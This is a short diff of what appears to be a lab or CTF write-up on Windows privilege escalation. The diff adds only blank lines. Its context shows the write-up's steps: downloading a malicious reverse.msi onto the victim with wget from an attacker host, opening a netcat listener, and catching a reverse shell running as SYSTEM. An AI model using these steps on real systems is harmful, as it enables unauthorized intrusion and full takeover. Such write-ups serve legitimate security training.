@@ -65,6 +65,7 @@ Next we set up a http server to download the file from the victim
 Next we download the reverse.msi to the victim
 <div class="alert-info">wget http://ip/reverse.msi -O reverse.msi</div>
 ![image](/assets/img/wget-msi.png)
+
 We now setup a new NetCat listener on Kali 
 <div class="alert-info">sudo nc -nlvp 55</div>
 ![image](/assets/img/nc-listener-55.png)
@@ -74,6 +75,7 @@ Finally we run the following command in the victim shell
 ![image](/assets/img/msiexec.png)
 
 Lets go back to the new nc listener and checkout if we did catch the reverse shell with system privileges.
+
 ![image](/assets/img/system-msiexec.png)
 
 Yes, we have shell and running it as system!
